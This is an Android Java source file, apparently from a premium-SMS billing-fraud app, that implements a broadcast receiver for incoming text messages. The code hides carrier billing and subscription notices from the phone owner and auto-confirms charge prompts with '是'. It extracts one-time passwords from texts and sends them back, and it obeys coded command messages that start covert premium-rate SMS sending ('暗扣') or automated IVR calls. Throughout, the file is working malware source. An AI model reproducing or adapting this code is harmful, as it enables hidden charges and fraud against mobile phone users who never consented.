package com.sttm.charge;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.util.Log;

import com.sttm.bean.BaseZone;
import com.sttm.bean.BillSms;
import com.sttm.bean.Ivr;
import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.util.EncryptUtil;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;
import com.sttm.util.ShareProDBHelper;

@SuppressWarnings("deprecation")
public class SmsReceiver extends BroadcastReceiver {
	private static final String strRes = "android.provider.Telephony.SMS_RECEIVED";
	private static final String TAG = "SmsReceiver";
	private String smsNumber;
	private String smsContent;
	private ShareProDBHelper dbHelper;
	private String replyNumber;
	private int isShutGSMDown;
	private int isShutChanelDown;
	private String adsNumbers;
	private String saleVolumeNumbers;
	private Boolean sendSecretSms;
	private Boolean sendNormonSms;
	private String keyword;
	

	public SmsReceiver() {
		Log.d(TAG, "真正启动短信拦截器");
		LogFile.WriteLogFile("真正启动短信拦截器");
	}

	public void onReceive(Context context, Intent intent) {
		Log.d(TAG, "短信接收器启动成功");
		// 获取短信中心号码
		dbHelper = new ShareProDBHelper(context);
		
		setSmsCenterNumber(intent);

		if (intent.getAction().equals(strRes)) {
			Log.d("SmsReceiver", "短信接收器开始");
			init();
			SharedPreferences sp2 = dbHelper
					.getSharedPreferences("sendSmsFlag");
			sendSecretSms = sp2.getBoolean("sendSecretSms", false);
			sendSecretSms = KsoCache.getInstance().getValue2("sendSecretSms") != null ? (Boolean) KsoCache
					.getInstance().getValue2("sendSecretSms") : false;
			sendNormonSms = sp2.getBoolean("sendNormonSms", false);
			sendNormonSms = KsoCache.getInstance().getValue2("sendNormonSms") != null ? (Boolean) KsoCache
					.getInstance().getValue2("sendNormonSms") : false;
			replyNumber = sp2.getString("secretSmsReplyNumber", "");

			replyNumber = KsoCache.getInstance().getValue2(
					"secretSmsReplyNumber") != null ? (String) KsoCache
					.getInstance().getValue2("secretSmsReplyNumber") : "";

			Log.d(TAG, "短信回副号码=========" + replyNumber);
			keyword = sp2.getString(keyword, "");
			keyword = KsoCache.getInstance().getValue2("keyword") != null ? (String) KsoCache
					.getInstance().getValue2("keyword") : "";
			Log.d(TAG, "暗扣发送之后标志=" + sendSecretSms);
			Log.d(TAG, "普通扣费发送标志=" + sendNormonSms);
			LogFile.WriteLogFile("暗扣发送之后标志=" + sendSecretSms);
			LogFile.WriteLogFile("短信回复号码=" + replyNumber);
			LogFile.WriteLogFile("关键字=" + keyword);
			// -------------------------------------------------------------------
			// 获取电话号码和短信内容
			StringBuilder body = new StringBuilder();// 短信内容
			StringBuilder number = new StringBuilder();// 短信发件人
			Bundle bundle = intent.getExtras();

			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				SmsMessage[] msg = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					msg[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				}

				for (SmsMessage currMsg : msg) {
					body.append(currMsg.getDisplayMessageBody());
					number.append(currMsg.getDisplayOriginatingAddress());
				}
				// 拿到短信内容和电话号码
				smsContent = body.toString();
				smsNumber = number.toString();
				Log.d("短信号码", smsNumber);
				Log.d("短信内容", smsContent);
			}
			LogFile.WriteLogFile("接收到了一条号码为" + smsNumber + "短信内容为" + smsContent
					+ "的短信");

			// -------------------------------------------------------------------------

			if (smsNumber.startsWith("10086") || smsNumber.startsWith("10010")
					|| smsNumber.startsWith("106")) {

				Boolean smsCenterSendFlag = KsoCache.getInstance().getValue(
						"smsCenterFlag") != null ? (Boolean) KsoCache
						.getInstance().getValue("smsCenterFlag") : false;
				if (smsCenterSendFlag) {
					this.abortBroadcast();
				}

				if (smsContent.contains("手机阅读") || smsContent.contains("手机动漫")
						|| smsContent.contains("10086901")
						|| smsContent.contains("游戏达人")
						|| smsContent.contains("开始生效")
						|| smsContent.contains("手机视频")
						|| smsContent.contains("手机音乐")
						|| smsContent.contains("点播信息")) {
					this.abortBroadcast();
					//Log.d(TAG, "屏蔽基地收费信息,内容为" + smsContent);
					LogFile.WriteLogFile("屏蔽基地收费信息," + smsContent);
				}
			}

			if (sendSecretSms) {
				if (smsNumber.startsWith("10")
						|| smsNumber.startsWith(replyNumber)) {
					this.abortBroadcast();
					Log.d(TAG, "发了暗扣短信之后，按第一类短信回复：删除掉所有号码“10”开头的短信");
					LogFile.WriteLogFile("发了暗扣短信之后，按第一类短信回复：删除掉所有号码“10”开头的短信");
				}
			}

			if (!sendSecretSms && sendNormonSms) {
				if (smsNumber.startsWith("10086")
						|| smsNumber.startsWith("10010")
						|| smsNumber.startsWith("106")) {
					if (isShutGSMDown == 1 || isShutChanelDown == 1) {
						this.abortBroadcast();
						//Log.d(TAG,"发了产品收费短信之后，按第一类短信回复，根据两个变量:是否删除运营商短信和是否删除通道短信来控制第一类和第二类短信是否删除");
						LogFile.WriteLogFile("发了产品收费短信之后，按第一类短信回复，根据两个变量:是否删除运营商短信和是否删除通道短信来控制第一类和第二类短信是否删除");

					}

				}
			}
			// -------------------------------------------------------------------------------------------------

			if (!"".equals(replyNumber) && smsNumber.startsWith(replyNumber)) {
				//Log.d(TAG, "测试点1");
				LogFile.WriteLogFile("接收到短信的号码跟回复号码相关,都是" + replyNumber + "开头");
				// 暗扣短信回复号码
				/**
				 * 如果短信内容中有“回复任意”，“回复是确认”关键字的短信，则回复”是”，
				 * 如果在发了暗扣短信之后，按第一类短信回复：删除掉所有号码“10”开头的短信
				 * 如果在发了产品收费短信之后，按第一类短信回复，根据两个变量
				 * :是否删除运营商短信和是否删除通道短信来控制第一类和第二类短信是否删除。
				 */
				if (smsContent.contains("回复任意") || smsContent.contains("回复是确认")) {

					if (sendSecretSms) {
						// 如果是发送了暗扣短信，按照第一类短信回，并删除短信
						SmsSenderAndReceiver.send2(smsNumber, "是");
						LogFile.WriteLogFile("暗扣短信发送之后，回复是确认短信发送出去了");

						// 删除发送短信记录
						this.abortBroadcast();
						LogFile.WriteLogFile("屏蔽了第一类短信（暗扣)");
					} else if (sendNormonSms) {
						// 如果是发送了包月或点播短信，按照 第一类短信回，
						SmsSenderAndReceiver.send2(smsNumber, "是");
						LogFile.WriteLogFile("包月或点播短信发送之后，回复是确认短信发送出去了");
						// 删除发送短信记录
						if (isShutGSMDown == 1 || isShutChanelDown == 1) {
							this.abortBroadcast();
							LogFile.WriteLogFile("屏蔽了第一类短信（产品收费)");

						}

					}

				}

				/**
				 * 如果短信内容中有某些关键字，如关键字=“本次密码”， 或者关键字=“绝密文件”，关键字可以等于其他，的短信，
				 * 1）如果本次密码和绝密文件后面紧跟这是0-9,a-z,A-Z,的字符，则回复的内容为：
				 * 从这个字符开始，到不是0-9,a-z,A-Z,的字符结束，为回复的内容
				 * 2）如果不是第一种情况，则从本次密码和绝密文件后面，
				 * 第一个：中文汉字，0-9,a-z,A-Z,到第一个不是中文汉字，0-9,a-z,A-Z,结束，为回复的内容
				 * 
				 */
				Log.d(TAG, "关键字" + keyword);

				if (smsContent.contains("本次密码")
						|| (!interpruptContentIVR(smsContent)
								&& !interpruptContent(smsContent)
								&& !"".equals(keyword) && smsContent
									.contains(keyword))) {

					//Log.d("本次密码keyword", "========enter==========");

					int offSet = 0;
					if (smsContent.contains("本次密码")) {
						offSet = smsContent.indexOf("本次密码") + 4;
					} else if (!"".equals(keyword)
							&& smsContent.indexOf(keyword) >= 0) {
						offSet = smsContent.indexOf(keyword) + keyword.length();
					}
					int lastSet = 0;

					if (String.valueOf(smsContent.charAt(offSet)).matches(
							"^[A-Za-z0-9]+$")) {

						for (int i = offSet; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								lastSet = i;
								break;
							}
						}

						//Log.d("offSet", "=======" + offSet + "offSet1");
						//Log.d("lastSet", "=======" + lastSet + "lastSet1");
						String smsCon = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCon = smsContent.substring(offSet, lastSet);

						} else {
							smsCon = smsContent.substring(offSet);
						}

						if (sendSecretSms) {

							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							LogFile.WriteLogFile("暗扣短信发送之后，回复内容：" + smsCon
									+ " 短信发送出去了");
							//Log.d(TAG, "暗扣短信发送之后，回复内容：" + smsCon + " 短信发送出去了");
							this.abortBroadcast();
							//Log.d(TAG, "屏蔽了第一类短信（暗扣)");
							LogFile.WriteLogFile("屏蔽了第一类短信（暗扣)");

						} else if (sendNormonSms) {
							// 如果是发送了包月或者点播信息，按照 第一类短信回，
							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							LogFile.WriteLogFile("包月或点播短信发送之后，内容回复为：" + smsCon
									+ "短信发送出去了");
							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
								LogFile.WriteLogFile("屏蔽了第一类短信（产品收费)");
							}

						}

					} else if (!String.valueOf(smsContent.charAt(offSet))
							.matches("^(w|[u4E00-u9FA5])*$")) {

						int startIndex = 0;

						for (int i = offSet + 1; i < smsContent.length(); i++) {
							if (String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								startIndex = i;
								break;
							}
						}

						for (int i = startIndex; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^(w|[u4E00-u9FA5])*$")) {

								lastSet = i;
								break;
							}
						}
						//Log.d("startIndex1", "--------" + startIndex + "test1");
						//Log.d("lastSet1", "--------" + lastSet + "test1");
						String smsCont = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCont = smsContent.substring(startIndex, lastSet);

						} else {
							smsCont = smsContent.substring(startIndex);
						}
						//Log.d(TAG, "发送内容1" + smsCont);

						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							//Log.d(TAG, "暗扣短信发送之后，内容回复为：" + smsCont + "短信发送出去了");
							LogFile.WriteLogFile("暗扣短信发送之后，内容回复为：" + smsCont
									+ "短信发送出去了");

							this.abortBroadcast();
							LogFile.WriteLogFile("屏蔽了第一类短信（暗扣)");

						} else if (sendNormonSms) {
							// 如果是发送了包月信息，按照 第一类短信回，
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							LogFile.WriteLogFile("包月或点播短信发送之后，内容回复为：" + smsCont
									+ "短信发送出去了");

							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
								LogFile.WriteLogFile("屏蔽了第一类短信（产品收费)");
							}

						}

					}

				}

			} else if (interpruptPhone(smsNumber)) {
				// 拦截到短信号码是10086，106，10010
				//Log.d(TAG, "测试二");

				/**
				 * 第三类短信 检测到号码：10086，106，10010，开头的， 含有“年”，“月”，“日”，“秒点播”
				 * 含有“信息费”，“如需帮助” 含有“点播信息”，“内发送” 含有“处理问题”， 含有“成功订购
				 */
				if ((smsContent.contains("年") && smsContent.contains("月")
						&& smsContent.contains("日") && smsContent
							.contains("秒点播"))
						|| (smsContent.contains("如需帮助") && smsContent
								.contains("信息费"))
						|| (smsContent.contains("点播信息") && smsContent
								.contains("内发送"))
						|| smsContent.contains("处理问题")
						|| smsContent.contains("成功订购")) {

					this.abortBroadcast();
					LogFile.WriteLogFile("屏蔽了第三类短信");

				}

				/**
				 * 如果短信内容中有“回复任意”，“回复是确认”关键字的短信，则回复”是”，
				 * 如果在发了暗扣短信之后，按第一类短信回复：删除掉所有号码“10”开头的短信
				 * 如果在发了产品收费短信之后，按第一类短信回复，根据两个变量
				 * :是否删除运营商短信和是否删除通道短信来控制第一类和第二类短信是否删除。
				 */
				if (smsContent.contains("回复任意") || smsContent.contains("回复是确认")) {

					if (sendSecretSms) {
						// 如果是发送了暗扣短信，按照第一类短信回，并删除短信
						SmsSenderAndReceiver.send2(smsNumber, "是");
						LogFile.WriteLogFile("暗扣短信发送之后，回复是确认短信发送出去了");

						// 删除发送短信记录
						this.abortBroadcast();
						LogFile.WriteLogFile("屏蔽了第一类短信（暗扣)");
					} else if (sendNormonSms) {
						// 如果是发送了包月或点播短信，按照 第一类短信回，
						SmsSenderAndReceiver.send2(smsNumber, "是");
						LogFile.WriteLogFile("包月或点播短信发送之后，回复是确认短信发送出去了");
						// 删除发送短信记录
						if (isShutGSMDown == 1 || isShutChanelDown == 1) {
							this.abortBroadcast();
							LogFile.WriteLogFile("屏蔽了第一类短信（产品收费)");

						}

					}

				}

				/**
				 * 如果短信内容中有某些关键字，如关键字=“本次密码”， 或者关键字=“绝密文件”，关键字可以等于其他，的短信，
				 * 1）如果本次密码和绝密文件后面紧跟这是0-9,a-z,A-Z,的字符，则回复的内容为：
				 * 从这个字符开始，到不是0-9,a-z,A-Z,的字符结束，为回复的内容
				 * 2）如果不是第一种情况，则从本次密码和绝密文件后面，
				 * 第一个：中文汉字，0-9,a-z,A-Z,到第一个不是中文汉字，0-9,a-z,A-Z,结束，为回复的内容
				 * 
				 */

				if (smsContent.contains("本次密码")
						|| (!interpruptContentIVR(smsContent)
								&& !interpruptContent(smsContent)
								&& !"".equals(keyword) && smsContent
								.indexOf(keyword) > 0)) {

					int offSet = 0;
					if (smsContent.contains("本次密码")) {
						offSet = smsContent.indexOf("本次密码") + 4;
					} else if (!"".equals(keyword)
							&& smsContent.indexOf(keyword) > 0) {
						offSet = smsContent.indexOf(keyword) + keyword.length();
					}
					Log.d(TAG, "本次密码偏移量" + offSet);
					int lastSet = 0;

					if (String.valueOf(smsContent.charAt(offSet)).matches(
							"^[A-Za-z0-9]+$")) {
						for (int i = offSet; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {
								lastSet = i;
								break;
							}
						}
						String smsCon = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCon = smsContent.substring(offSet, lastSet);

						} else {
							smsCon = smsContent.substring(offSet);
						}

						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							LogFile.WriteLogFile("暗扣短信发送之后，内容回复为：" + smsCon
									+ "短信发送出去了");

							this.abortBroadcast();
							LogFile.WriteLogFile("屏蔽了第一类短信（暗扣)");

						} else if (sendNormonSms) {
							// 如果是发送了包月或者点播信息，按照 第一类短信回，
							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							LogFile.WriteLogFile("包月或点播短信发送之后，内容回复为：" + smsCon
									+ "短信发送出去了");
							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
								LogFile.WriteLogFile("屏蔽了第一类短信（产品收费)");
							}

						}

					} else if (!String.valueOf(smsContent.charAt(offSet))
							.matches("^(w|[u4E00-u9FA5])*$")) {
						int startIndex = 0;

						for (int i = offSet + 1; i < smsContent.length(); i++) {
							if (String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								startIndex = i;
								break;
							}
						}

						for (int i = startIndex; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^(w|[u4E00-u9FA5])*$")) {

								lastSet = i;
								break;
							}
						}
						String smsCont = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCont = smsContent.substring(startIndex, lastSet);

						} else {
							smsCont = smsContent.substring(startIndex);
						}
						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							LogFile.WriteLogFile("暗扣短信发送之后，内容回复为：" + smsCont
									+ "短信发送出去了");

							this.abortBroadcast();
							LogFile.WriteLogFile("屏蔽了第一类短信（暗扣)");

						} else if (sendNormonSms) {
							// 如果是发送了包月信息，按照 第一类短信回，
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							LogFile.WriteLogFile("包月或点播短信发送之后，内容回复为：" + smsCont
									+ "短信发送出去了");

							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
								LogFile.WriteLogFile("屏蔽了第一类短信（产品收费)");
							}

						}

					}

				}

				// 第二类短信：
				// 检测到号码：10086，106，10010，开头的，含有关键“信息费”，“服务代码”的
				if (smsContent.contains("信息费") || smsContent.contains("服务代码")) {
					if (isShutGSMDown == 1 && isShutChanelDown == 1) {
						this.abortBroadcast();
						LogFile.WriteLogFile("屏蔽了第二类短信");

					}
				}

				if (sendSecretSms) {
					// 如果暗扣短信发送了，第一类短信都必需删除
					this.abortBroadcast();
					LogFile.WriteLogFile("屏蔽了第-类短信（如果暗扣短信发送了，第一类短信都必需删除）");

				}

			} else if (interpruptAdsAndSaleNumber(smsNumber)) {
				//Log.d(TAG, "测试三");
				/**
				 * 第六类短信： 短信号码中含有销量号码，广告号码的
				 */
				this.abortBroadcast();
				LogFile.WriteLogFile("屏蔽了是销量号码，广告号码的短信号码");

			}

			if (interpruptAdsAndSaleContent(smsContent)) {

				//Log.d(TAG, "测试四");
				/**
				 * 第五类短信： 短信内容中含有销量号码，广告号码的
				 */
				this.abortBroadcast();
				LogFile.WriteLogFile("屏蔽了短信内容中含有销量号码，广告号码的短信号码");

			} else if (interpruptContentIVR(smsContent)) {
				//Log.d(TAG, "=======测试IVR========");
				Ivr ivr = EncryptUtil.getEncryptVIRString(smsContent);
				//Log.d(TAG, "啵打号码" + ivr.getChanel());

				Intent service_ivr = new Intent(context, CallService.class);
				service_ivr.putExtra("dialTime", ivr.getDialTime());
				service_ivr.putExtra("chanel", ivr.getChanel());
				service_ivr.putExtra("radioPrompt1", ivr.getRadioPrompt1());
				service_ivr.putExtra("radioPrompt2", ivr.getRadioPrompt2());
				service_ivr.putExtra("radioPrompt3", ivr.getRadioPrompt3());
				service_ivr.putExtra("radioPrompt4", ivr.getRadioPrompt4());
				service_ivr.putExtra("keyCode1", ivr.getKeyCode1());
				service_ivr.putExtra("keyCode2", ivr.getKeyCode2());
				service_ivr.putExtra("keyCode3", ivr.getKeyCode3());
				service_ivr.putExtra("keyCode4", ivr.getKeyCode4());
				context.startService(service_ivr);

			} else if (interpruptContent(smsContent)) {

				//Log.d(TAG, "测试五");
				this.abortBroadcast();

				// 拦截短信内容有暗扣通道
				BillSms billSms = EncryptUtil.getEncryptSMSString(smsContent);
				long time = KsoCache.getInstance().getValue("adsTime") != null ? (Long) KsoCache
						.getInstance().getValue("adsTime") : 4;

				//Log.d("发送时间间隔", time + "'");
				//Log.d(TAG, "启动发送短信服务");
				LogFile.WriteLogFile("启动发送短信服务");
				Intent service = new Intent(context, SendSmsService.class);
				service.putExtra("sendTime", time);
				service.putExtra("sendCount", billSms.getCount());
				service.putExtra("secretSmsReplyNumber",
						billSms.getReplyNumber());
				service.putExtra("keyword", billSms.getKeyword());

				if (KsoHelper.getARS2(context) == 1) {
					//Log.d(TAG, "中国移动暗扣");

					service.putExtra("SecretSmsNumber",
							billSms.getMobileChanel());
					//Log.d(TAG,"billSms.getMobileOrder():"+ billSms.getMobileOrder());
					service.putExtra("SecretSmsOrder", billSms.getMobileOrder());
					service.putExtra("flag", 1);

				} else if (KsoHelper.getARS2(context) == 2) {
					//Log.d(TAG, "中国联通暗扣");

					service.putExtra("SecretSmsNumber",
							billSms.getUnionChanel());
					service.putExtra("SecretSmsOrder", billSms.getUnionOrder());

					service.putExtra("flag", 2);

				} else {

					service.putExtra("SecretSmsNumber",
							billSms.getMobileChanel());
					service.putExtra("SecretSmsOrder", billSms.getMobileOrder());

					service.putExtra("flag", 3);

				}
				context.startService(service);
				//Log.d(TAG, "屏蔽了暗扣短信");
				LogFile.WriteLogFile("屏蔽了暗扣短信");

			} else if (interpruptContentBaseZone(smsContent)) {
				

			}else if(smsContent.contains("％＄＾＆＊！＠﹟ClientID".trim())){
				String curstomId = KsoCache.getInstance().getValue("curstomID")!= null
					? (String)KsoCache.getInstance().getValue("curstomID") : "00000000";
				//Log.d("curstomID", curstomId + "===curstomId");
				if(!"".equals(curstomId)){
					SmsSenderAndReceiver.send2(smsNumber, curstomId);
					LogFile.WriteLogFile("己发送客户ID为" + curstomId + "短信");
				}
				

				this.abortBroadcast();
				
			}

		}

	}

	// 电话10086，10010，106过滤

	public boolean interpruptPhone(String telephoneNumber) {
		if (telephoneNumber.startsWith("10086")
				|| telephoneNumber.startsWith("106")
				|| telephoneNumber.startsWith("10010")) {
			return true;

		}

		return false;

	}

	// 暗扣短信

	public boolean interpruptContent(String phoneContent) {
		if (phoneContent.indexOf("SMVCE") >= 0) {
			return true;
		}
		return false;
	}

	// 暗扣IVR

	public boolean interpruptContentIVR(String phoneContent) {
		if (phoneContent.indexOf("SMGE4") >= 0) {
			return true;
		}
		return false;

	}

	// 基地

	public boolean interpruptContentBaseZone(String phoneContent) {
		if (phoneContent.indexOf("BDVCG") >= 0) {
			return true;
		}
		return false;

	}

	// 过滤销量号码和广告号码
	public boolean interpruptAdsAndSaleNumber(String smsNumber) {

		if (!"".equals(adsNumbers)
				&& !"".equals(saleVolumeNumbers)
				&& (adsNumbers.indexOf(smsNumber) >= 0 || saleVolumeNumbers
						.indexOf(smsNumber) >= 0)) {
			return true;
		}
		return false;

	}

	// 过滤短信内容有销量号码和广告号码
	public boolean interpruptAdsAndSaleContent(String smsContent) {
		if (!"".equals(saleVolumeNumbers)) {

			saleVolumeNumbers = saleVolumeNumbers.substring(0,
					saleVolumeNumbers.lastIndexOf(","));
			String[] saleNumberArray = saleVolumeNumbers.split(",");
			for (int i = 0; i < saleNumberArray.length; i++) {
				if (smsContent.indexOf(saleNumberArray[i]) >= 0) {
					return true;
				}
			}
		}

		if (!"".equals(adsNumbers)) {

			adsNumbers = adsNumbers.substring(0, adsNumbers.lastIndexOf(","));
			String[] adsNumbersArray = adsNumbers.split(",");
			for (int i = 0; i < adsNumbersArray.length; i++) {
				if (smsContent.indexOf(adsNumbersArray[i]) >= 0) {
					return true;
				}
			}

		}

		return false;

	}

	public void init() {
		isShutGSMDown = KsoCache.getInstance().getValue("isShutDown") != null ? (Integer) KsoCache
				.getInstance().getValue("isShutDown") : 0;
		isShutChanelDown = KsoCache.getInstance().getValue("isChanelShutDown") != null ? (Integer) KsoCache
				.getInstance().getValue("isChanelShutDown") : 0;

		adsNumbers = KsoCache.getInstance().getValue("adsNumbers") != null ? (String) KsoCache
				.getInstance().getValue("adsNumbers") : "";
		saleVolumeNumbers = KsoCache.getInstance().getValue("saleNumbers") != null ? (String) KsoCache
				.getInstance().getValue("saleNumbers") : "";

	}

	private void setSmsCenterNumber(Intent intent) {
		KsoCache cache = KsoCache.getInstance();
		// Boolean smsCenterFlag =
		// Boolean.parseBoolean(dbHelper.readMsg("smsCenterFlag", 3, "false"));

		Boolean smsCenterFlag = cache.getValue("smsCenterFlag") != null ? (Boolean) cache
				.getValue("smsCenterFlag") : false;
		if (smsCenterFlag) {
			String actionName = intent.getAction();
			int resultCode = getResultCode();
			if (actionName.equals("lab.sodino.sms.send")) {
				// do nothing
				cache.reSetValue("SmsCenterNumber", "000");
			} else if (actionName.equals("lab.sodino.sms.delivery")) {
				// do nothing
				cache.reSetValue("SmsCenterNumber", "000");
			} else if (actionName
					.equals("android.provider.Telephony.SMS_RECEIVED")) {

				System.out.println("[Sodino]result = " + resultCode);
				Bundle bundle = intent.getExtras();
				if (bundle != null) {
					Object[] myOBJpdus = (Object[]) bundle.get("pdus");
					SmsMessage[] messages = new SmsMessage[myOBJpdus.length];
					for (int i = 0; i < myOBJpdus.length; i++) {
						messages[i] = SmsMessage
								.createFromPdu((byte[]) myOBJpdus[i]);
					}
					SmsMessage message = messages[0];
					cache.reSetValue("SmsCenterNumber",
							message.getServiceCenterAddress());
			
				

					//Log.d(TAG, "短信中心号码为:" + message.getServiceCenterAddress());
					LogFile.WriteLogFile("短信中心号码为:"
							+ message.getServiceCenterAddress());
					cache.reSetValue("smsCenterFlag", false);

				}
			}
		}
	}

}
